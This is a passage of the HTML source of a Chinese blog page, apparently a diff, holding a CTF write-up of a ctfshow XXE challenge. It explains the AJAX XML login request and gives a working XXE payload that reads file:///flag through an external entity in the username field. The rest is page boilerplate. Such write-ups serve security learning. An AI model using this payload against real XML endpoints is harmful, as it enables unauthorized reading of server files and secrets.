&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;1&quot;</span>)&#123;<br>        		$(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-built_in">text</span>(msg + <span class="hljs-string">&quot; login success!&quot;</span>);<br>        	&#125;<span class="hljs-keyword">else</span>&#123;<br>        		$(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-built_in">text</span>(<span class="hljs-string">&quot;error:&quot;</span> + msg);<br>        	&#125;<br>        &#125;,<br><span class="hljs-comment">//在 AJAX 请求失败时执行 当发生错误时，会在页面上显示 errorThrown + &#x27;:&#x27; + textStatus，即显示异常信息和错误状态描述</span><br>        error: <span class="hljs-keyword">function</span> (<span class="hljs-params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;<br>            $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-built_in">text</span>(errorThrown + <span class="hljs-string">&#x27;:&#x27;</span> + textStatus);<br>        &#125;<br>    &#125;); <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>contentType: “application&#x2F;xml;charset&#x3D;utf-8”,&#x2F;&#x2F;告诉服务器我的数据类型</p>
+<p>X-Requested-With: XMLHttpRequest 这是告诉服务器我是ajax进行异步通信 数据可能是xml也可能是json(这俩大概率) 都有可能</p>
+<p>发送的是xml数据 回来的也是xml数据(其实回来的不用管)服务器肯定是解析xml</p>
+<p>发送之后发现还是有回显的。</p>
+<p><img src="/../image/ctfshow-xxe-5.png"></p>
+<p>payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">payload</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-symbol">&amp;xxe;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>admin<br><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>发送之后在bp和页面都可看到flag</p>
+<p><img src="/../image/ctfshow-xxe-6.png"></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments">
+    <script>
+        {
+            const comments = document.getElementById("comments");
+            const script = document.createElement("script");
+            script.src = "https://giscus.app/client.js";
+            script.setAttribute('data-repo', "MIXBP/MIXBP.github.io");
+            script.setAttribute('data-repo-id', "R_kgDONYaZsg");
+            script.setAttribute('data-category', "Announcements");
+            script.setAttribute('data-category-id', "DIC_kwDONYaZss4ClAnT");
+            script.setAttribute('data-mapping', "pathname");
+            script.setAttribute('data-strict', "0");
+            script.setAttribute('data-reactions-enabled', "1");
+            script.setAttribute('data-emit-metadata', "0");
+            script.setAttribute('data-input-position', "top");
+            script.setAttribute('data-theme', "noborder_dark");
+            script.setAttribute('data-lang', "zh-CN");
+            script.setAttribute('data-loading', "lazy");
+            script.setAttribute('crossorigin', "anonymous");
+            script.setAttribute('async', "");
+            comments.appendChild(script);
+        }
+    </script>
+</div>
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©MIXBP 2024
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    #post {
+        background: url(/img/background.jpg);
+    }
+    
+    
+    #post .index {
+        background: url(/img/background2.jpg);
+    }
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.5;
+        background: url("/img/bjtp.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+<div class="mobile-menus-out" >
+
+</div>
+<div class="mobile-menus">
+    
+    
+    
+    <a class="dynamic-menu " target="_self"   href="https://mixbp.github.io/">MIXBP</a>
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://mixbp.github.io/">github</a>
+    
+</div>
+
+
+</html>
